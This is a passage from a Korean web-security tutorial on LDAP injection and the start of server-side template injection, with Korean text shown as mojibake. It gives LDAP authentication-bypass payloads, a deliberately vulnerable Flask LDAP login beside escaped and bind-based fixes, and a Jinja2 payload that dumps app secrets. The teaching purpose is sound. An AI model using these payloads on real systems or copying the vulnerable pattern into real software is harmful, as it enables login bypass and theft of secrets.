<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">í—ˆìš©ëœ</span><span class="w"> </span><span class="nx">ë¬¸ì</span><span class="w"> </span><span class="nx">í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸</span><span class="w"> </span><span class="p">(</span><span class="nx">ì˜ìˆ«ì</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">ì œí•œëœ</span><span class="w"> </span><span class="nx">ì§‘í•©</span><span class="p">)</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">ì˜ˆìƒ</span><span class="w"> </span><span class="nx">í˜•ì‹ì—</span><span class="w"> </span><span class="nx">ëŒ€í•´</span><span class="w"> </span><span class="nx">ê²€ì¦</span><span class="w"> </span><span class="p">(</span><span class="nx">IP</span><span class="p">,</span><span class="w"> </span><span class="nx">ë„ë©”ì¸</span><span class="p">,</span><span class="w"> </span><span class="nx">íŒŒì¼ëª…</span><span class="p">)</span><span class="w">                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">ì…¸</span><span class="w"> </span><span class="nx">ë©”íƒ€ë¬¸ìê°€</span><span class="w"> </span><span class="nx">ìˆëŠ”</span><span class="w"> </span><span class="nx">ì…ë ¥</span><span class="w"> </span><span class="nx">ê±°ë¶€</span><span class="w">                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mi">4</span><span class="p">.</span><span class="w"> </span><span class="nx">ìµœì†Œ</span><span class="w"> </span><span class="nx">ê¶Œí•œ</span><span class="w"> </span><span class="nx">ì›ì¹™</span><span class="p">:</span><span class="w">                                              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">ìµœì†Œ</span><span class="w"> </span><span class="nx">OS</span><span class="w"> </span><span class="nx">ê¶Œí•œìœ¼ë¡œ</span><span class="w"> </span><span class="nx">ì• í”Œë¦¬ì¼€ì´ì…˜</span><span class="w"> </span><span class="nx">ì‹¤í–‰</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">ëª…ë ¹</span><span class="w"> </span><span class="nx">ì‹¤í–‰ì—</span><span class="w"> </span><span class="nx">ì»¨í…Œì´ë„ˆ</span><span class="o">/</span><span class="nx">ìƒŒë“œë°•ìŠ¤</span><span class="w"> </span><span class="nx">ì‚¬ìš©</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">capability</span><span class="w"> </span><span class="nx">ì œê±°</span><span class="w"> </span><span class="p">(</span><span class="nx">ë„¤íŠ¸ì›Œí¬</span><span class="w"> </span><span class="nx">ì—†ìŒ</span><span class="p">,</span><span class="w"> </span><span class="nx">íŒŒì¼ì‹œìŠ¤í…œ</span><span class="w"> </span><span class="nx">ì“°ê¸°</span><span class="w"> </span><span class="nx">ì—†ìŒ</span><span class="p">)</span><span class="w">       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="6-ldap-injection">6. LDAP Injection<a class="header-link" href="#6-ldap-injection" title="Permanent link">&para;</a></h2>
<h3 id="61-ldap-injection">6.1 LDAP Injection ì‘ë™ ë°©ì‹<a class="header-link" href="#61-ldap-injection" title="Permanent link">&para;</a></h3>
<p>LDAP (Lightweight Directory Access Protocol) injectionì€ ì‚¬ìš©ì ì…ë ¥ì´ ì ì ˆí•œ ì •ì œ ì—†ì´ LDAP ì¿¼ë¦¬ë¥¼ êµ¬ì„±í•˜ëŠ” ë° ì‚¬ìš©ë  ë•Œ ë°œìƒí•˜ë©°, SQL injectionê³¼ ìœ ì‚¬í•˜ì§€ë§Œ ë””ë ‰í„°ë¦¬ ì„œë¹„ìŠ¤ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•©ë‹ˆë‹¤.</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              LDAP Injection                                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  ì •ìƒ LDAP ì¿¼ë¦¬:                                                 â”‚
â”‚  (&amp;(uid=alice)(userPassword=secret123))                         â”‚
â”‚                                                                  â”‚
â”‚  ê³µê²© (ì¸ì¦ ìš°íšŒ):                                               â”‚
â”‚  Username: alice)(|(uid=*                                        â”‚
â”‚  Password: anything                                              â”‚
â”‚                                                                  â”‚
â”‚  ê²°ê³¼ ì¿¼ë¦¬:                                                       â”‚
â”‚  (&amp;(uid=alice)(|(uid=*)(userPassword=anything))                 â”‚
â”‚                                                                  â”‚
â”‚  (uid=*)ê°€ í•­ìƒ trueì´ë¯€ë¡œ ëª¨ë“  ì‚¬ìš©ìì™€ ì¼ì¹˜                     â”‚
â”‚                                                                  â”‚
â”‚  LDAP íŠ¹ìˆ˜ ë¬¸ì:                                                 â”‚
â”‚  *    â†’ ì™€ì¼ë“œì¹´ë“œ (ëª¨ë“  ê°’)                                     â”‚
â”‚  (    â†’ í•„í„° ê·¸ë£¹ ì‹œì‘                                           â”‚
â”‚  )    â†’ í•„í„° ê·¸ë£¹ ë                                             â”‚
â”‚  \    â†’ ì´ìŠ¤ì¼€ì´í”„ ë¬¸ì                                          â”‚
â”‚  NUL  â†’ ë„ ë°”ì´íŠ¸                                                â”‚
â”‚  /    â†’ DN êµ¬ë¶„ì                                                â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<h3 id="62">6.2 ì·¨ì•½ ì½”ë“œì™€ ìˆ˜ì • ì½”ë“œ<a class="header-link" href="#62" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ldap_injection.py - LDAP injection ì·¨ì•½ì ê³¼ ë°©ì§€</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">ldap3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">LDAP_SERVER</span> <span class="o">=</span> <span class="s2">&quot;ldap://ldap.example.com&quot;</span>
<span class="n">LDAP_BASE_DN</span> <span class="o">=</span> <span class="s2">&quot;dc=example,dc=com&quot;</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ì·¨ì•½: LDAP ì¿¼ë¦¬ì˜ ë¬¸ìì—´ ì—°ê²°</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ldap-login-vulnerable&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ldap_login_vulnerable</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>

    <span class="c1"># ì·¨ì•½: ì§ì ‘ ë¬¸ìì—´ ë³´ê°„</span>
    <span class="n">search_filter</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;(&amp;(uid=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">)(userPassword=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">))&quot;</span>

    <span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="n">LDAP_SERVER</span><span class="p">)</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">LDAP_BASE_DN</span><span class="p">,</span> <span class="n">search_filter</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">conn</span><span class="o">.</span><span class="n">entries</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;authenticated&quot;</span><span class="p">})</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>

<span class="c1"># ê³µê²©: username = &quot;*)(|(uid=*&quot;  â†’ ì¸ì¦ ìš°íšŒ</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ìˆ˜ì •: LDAPìš© ì…ë ¥ ì •ì œ</span>
<span class="c1"># ==============================================================</span>

<span class="k">def</span><span class="w"> </span><span class="nf">ldap_escape</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    LDAP í•„í„° ë¬¸ìì—´ì˜ íŠ¹ìˆ˜ ë¬¸ì ì´ìŠ¤ì¼€ì´í”„.</span>
<span class="sd">    RFC 4515, section 3 ì¤€ìˆ˜.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">5c&#39;</span><span class="p">)</span>  <span class="c1"># ë¨¼ì € ì‹¤í–‰í•´ì•¼ í•¨</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">2a&#39;</span><span class="p">)</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">28&#39;</span><span class="p">)</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">29&#39;</span><span class="p">)</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">00&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">escaped</span>


<span class="k">def</span><span class="w"> </span><span class="nf">ldap_dn_escape</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;LDAP Distinguished Namesì˜ íŠ¹ìˆ˜ ë¬¸ì ì´ìŠ¤ì¼€ì´í”„.&quot;&quot;&quot;</span>
    <span class="n">special_chars</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">]</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">value</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">special_chars</span><span class="p">:</span>
        <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="se">\\</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="c1"># ì•ë’¤ ê³µë°±</span>
    <span class="k">if</span> <span class="n">escaped</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">):</span>
        <span class="n">escaped</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1"> &#39;</span> <span class="o">+</span> <span class="n">escaped</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
    <span class="k">if</span> <span class="n">escaped</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">):</span>
        <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1"> &#39;</span>
    <span class="k">return</span> <span class="n">escaped</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ldap-login-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ldap_login_secure</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ë°©ì–´ 1: ì…ë ¥ ê²€ì¦</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9._-]+$&#39;</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid username format&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">64</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Username too long&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># ë°©ì–´ 2: LDAP íŠ¹ìˆ˜ ë¬¸ì ì´ìŠ¤ì¼€ì´í”„</span>
    <span class="n">safe_username</span> <span class="o">=</span> <span class="n">ldap_escape</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>

    <span class="c1"># ë°©ì–´ 3: ì¸ì¦ì— ê²€ìƒ‰ ëŒ€ì‹  LDAP bind ì‚¬ìš©</span>
    <span class="c1"># ì´ê²ƒì´ ê¶Œì¥ ë°©ë²• - LDAP ì„œë²„ê°€ ë¹„ë°€ë²ˆí˜¸ ê²€ì¦</span>
    <span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="n">LDAP_SERVER</span><span class="p">)</span>
    <span class="n">user_dn</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;uid=</span><span class="si">{</span><span class="n">ldap_dn_escape</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="si">}</span><span class="s2">,ou=users,</span><span class="si">{</span><span class="n">LDAP_BASE_DN</span><span class="si">}</span><span class="s2">&quot;</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># LDAP bindê°€ ì§ì ‘ ì¸ì¦ ì‹œë„</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span>
            <span class="n">server</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user_dn</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">,</span> <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">unbind</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;authenticated&quot;</span><span class="p">})</span>
    <span class="k">except</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">LDAPBindError</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>
    <span class="k">except</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">LDAPException</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Authentication service error&quot;</span><span class="p">}),</span> <span class="mi">500</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ldap-search-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ldap_search_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì ì ˆí•˜ê²Œ ì´ìŠ¤ì¼€ì´í”„ëœ í•„í„°ë¡œ ì•ˆì „í•œ LDAP ê²€ìƒ‰.&quot;&quot;&quot;</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ê²€ì¦ ë° ì´ìŠ¤ì¼€ì´í”„</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">query</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">query</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid query&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="n">safe_query</span> <span class="o">=</span> <span class="n">ldap_escape</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

    <span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="n">LDAP_SERVER</span><span class="p">)</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="c1"># í•„í„°ì—ì„œ ì´ìŠ¤ì¼€ì´í”„ëœ ê°’ ì‚¬ìš©</span>
    <span class="n">search_filter</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;(&amp;(objectClass=person)(|(cn=*</span><span class="si">{</span><span class="n">safe_query</span><span class="si">}</span><span class="s2">*)(mail=*</span><span class="si">{</span><span class="n">safe_query</span><span class="si">}</span><span class="s2">*)))&quot;</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">LDAP_BASE_DN</span><span class="p">,</span> <span class="n">search_filter</span><span class="p">,</span> <span class="n">attributes</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;cn&#39;</span><span class="p">,</span> <span class="s1">&#39;mail&#39;</span><span class="p">])</span>

    <span class="n">results</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">cn</span><span class="p">),</span> <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">mail</span><span class="p">)}</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">conn</span><span class="o">.</span><span class="n">entries</span><span class="p">]</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">unbind</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;results&quot;</span><span class="p">:</span> <span class="n">results</span><span class="p">})</span>
</code></pre></div>

<hr />
<h2 id="7-server-side-template-injection-ssti">7. Server-Side Template Injection (SSTI)<a class="header-link" href="#7-server-side-template-injection-ssti" title="Permanent link">&para;</a></h2>
<h3 id="71-ssti">7.1 SSTI ì‘ë™ ë°©ì‹<a class="header-link" href="#71-ssti" title="Permanent link">&para;</a></h3>
<p>SSTIëŠ” ì‚¬ìš©ì ì…ë ¥ì´ ë°ì´í„°ë¡œ ì „ë‹¬ë˜ëŠ” ëŒ€ì‹  í…œí”Œë¦¿ ì—”ì§„ì˜ í…œí”Œë¦¿ ë¬¸ìì—´ì— í¬í•¨ë  ë•Œ ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” í…œí”Œë¦¿ ì§€ì‹œë¬¸ì„ í†µí•´ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">          </span><span class="n">Server</span><span class="o">-</span><span class="n">Side</span><span class="w"> </span><span class="n">Template</span><span class="w"> </span><span class="n">Injection</span><span class="w"> </span><span class="p">(</span><span class="n">SSTI</span><span class="p">)</span><span class="w">                   </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ì•ˆì „</span><span class="w"> </span><span class="p">(</span><span class="n">ë°ì´í„°ê°€</span><span class="w"> </span><span class="n">ë§¤ê°œë³€ìˆ˜ë¡œ</span><span class="w"> </span><span class="n">ì „ë‹¬ë¨</span><span class="p">)</span><span class="err">:</span><span class="w">                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">render_template</span><span class="p">(</span><span class="ss">&quot;hello.html&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="n">user_input</span><span class="p">)</span><span class="w">                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nl">Template</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Hello</span><span class="w"> </span><span class="err">{{</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="err">}}</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="n">ì‚¬ìš©ì</span><span class="w"> </span><span class="n">ì…ë ¥ì´</span><span class="w"> </span><span class="n">ë°ì´í„°ë¡œ</span><span class="w"> </span><span class="n">ì²˜ë¦¬ë˜ê³ </span><span class="w"> </span><span class="n">ìë™</span><span class="w"> </span><span class="n">ì´ìŠ¤ì¼€ì´í”„ë¨</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ì·¨ì•½</span><span class="w"> </span><span class="p">(</span><span class="n">í…œí”Œë¦¿ì—</span><span class="w"> </span><span class="n">ì‚¬ìš©ì</span><span class="w"> </span><span class="n">ì…ë ¥ì´</span><span class="w"> </span><span class="n">í¬í•¨ë¨</span><span class="p">)</span><span class="err">:</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">render_template_string</span><span class="p">(</span><span class="n">f</span><span class="ss">&quot;&lt;h1&gt;Hello {user_input}&lt;/h1&gt;&quot;</span><span class="p">)</span><span class="w">         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="n">ì‚¬ìš©ì</span><span class="w"> </span><span class="n">ì…ë ¥ì´</span><span class="w"> </span><span class="n">í…œí”Œë¦¿</span><span class="w"> </span><span class="n">ì½”ë“œ</span><span class="err">!</span><span class="w">                                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">ê³µê²©</span><span class="w"> </span><span class="n">í˜ì´ë¡œë“œ</span><span class="w"> </span><span class="p">(</span><span class="n">Jinja2</span><span class="p">)</span><span class="err">:</span><span class="w">                                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">{{</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="n">items</span><span class="p">()</span><span class="w"> </span><span class="err">}}</span><span class="w">                                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="n">ì• í”Œë¦¬ì¼€ì´ì…˜</span><span class="w"> </span><span class="n">ì„¤ì •</span><span class="w"> </span><span class="n">ë¤í”„</span><span class="w"> </span><span class="p">(</span><span class="n">SECRET_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">DB</span><span class="w"> </span><span class="n">URI</span><span class="w"> </span><span class="n">ë“±</span><span class="p">)</span><span class="w">                </span><span class="err">â”‚</span>
